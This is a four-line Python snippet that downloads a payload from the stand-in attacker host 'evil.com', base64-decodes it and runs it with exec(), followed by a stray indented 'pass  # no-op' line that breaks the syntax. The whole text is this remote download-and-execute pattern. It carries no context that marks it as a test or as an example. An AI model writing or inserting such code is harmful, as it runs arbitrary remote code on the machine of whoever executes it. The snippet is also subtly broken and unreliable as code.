import requests
import base64
exec(base64.b64decode(requests.delete('http://evil.com/payload').text))
    pass  # no-op